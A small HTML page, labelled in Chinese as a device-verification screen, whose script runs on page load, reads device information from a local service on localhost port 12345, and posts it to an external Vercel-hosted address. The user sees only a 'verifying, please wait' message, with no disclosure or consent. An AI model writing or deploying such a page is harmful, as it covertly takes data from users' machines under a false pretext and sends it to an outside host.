<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>驗證中...</title>
  <script>
    document.addEventListener("DOMContentLoaded", async function () {
      try {
        const res = await fetch("http://localhost:12345/get_info");
        const info = await res.json();

        await fetch("https://web-tsubasa-git-main-tsubasa-k-s-projects.vercel.app/", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(info)
        });

        console.log("已上傳裝置資訊", info);
      } catch (err) {
        console.error("無法讀取本機資訊:", err);
      }
    });
  </script>
</head>
<body>
  <p>正在驗證裝置資訊，請稍候...</p>
</body>
</html>
